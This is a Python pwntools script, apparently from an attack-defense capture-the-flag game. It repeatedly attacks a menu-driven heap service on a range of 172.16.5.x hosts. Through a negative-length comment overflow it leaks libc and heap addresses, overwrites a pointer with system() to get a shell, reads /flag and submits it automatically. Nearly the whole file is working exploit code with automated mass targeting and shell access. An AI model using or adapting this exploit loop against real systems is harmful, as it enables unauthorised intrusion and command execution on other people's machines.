import flag
from time import sleep
from pwn import *

debug=0
while 1:
    for x in xrange(10,27):
        try:
            if x==18:
                continue
            if debug:
                context.log_level = 'debug'
                p=process('./autoexp')
                gdb.attach(p)
                e=ELF('/lib/x86_64-linux-gnu/libc.so.6')
            else:
                p=remote('172.16.5.{}'.format(x),5005,timeout=5)
                e=ELF('./server.libc')

            def add(name,parameters,datas):
                p.recvuntil('Option:')
                p.sendline('1')
                p.recvuntil(':')
                p.sendline(name)
                p.recvuntil(':')
                if type(parameters) is list:
                    for param in parameters:
                        p.sendline(param)
                else:
                    p.sendline(parameters)
                p.sendline()
                p.recvuntil(':')
                if type(datas) is list:
                    for data in datas:
                        p.sendline(data)
                else:
                    p.sendline(datas)
                p.sendline()

            def modifyParam(funindex,paramindex,content):
                p.recvuntil('Option:')
                p.sendline('3')
                p.recvuntil(':')
                p.sendline(str(funindex))
                p.recvuntil('Option:')
                p.sendline('5')
                p.recvuntil(':')
                p.sendline(str(paramindex))
                p.recvuntil('content')
                p.sendline(content)

            def comment(funindex,length,cmt):
                p.recvuntil('Option:')
                p.sendline('3')
                p.recvuntil(':')
                p.sendline(str(funindex))
                p.recvuntil('Option:')
                p.sendline('9')
                p.recvuntil('the length of your comment')
                p.sendline(str(length))
                p.sendline(cmt)
            def leak(addr):
                comment(1, -1, 'a' * 0x18 + p64(0x31) + p64(addr))
                p.recvuntil('Option:')
                p.sendline('4')
                p.recvuntil('2: ')
                p.sendline('99')
                return u64(p.recvuntil('\n')[:-1].ljust(8, '\x00'))

            add('fun1','p1','d1')
            comment(1,20,'aaaa')
            add('fun2','p2','d2')
            malloc=leak(0x603210)
            heap=leak(0x6036E8)
            log.success('malloc:'+hex(malloc))
            log.success('heap:'+hex(heap))
            paramlist=0x0603700
            comment(1, -1, p64(0x603228)+'a' * 0x10+ p64(0x31) + p64(0x603210)+p64(paramlist))
            p.recvuntil('Option:')
            p.sendline('6')
            p.recvuntil('Option:')
            p.sendline('2')
            p.recvuntil('exploit')
            p.sendline(p64(0x603228))
            system=malloc-e.symbols['malloc']+e.symbols['system']
            modifyParam(2,1,p64(system))
            p.sendline()
            p.recvuntil('Option:')
            p.sendline('sh')
            p.sendline('cat /flag')
            p.recvuntil('\n')
            f=p.recvuntil('\n')[:-1]
            log.success('flag:'+f)
            print flag.send(f)
            p.close()
        except Exception as e:
            log.critical(e.message)
            p.close()
    sleep(150)
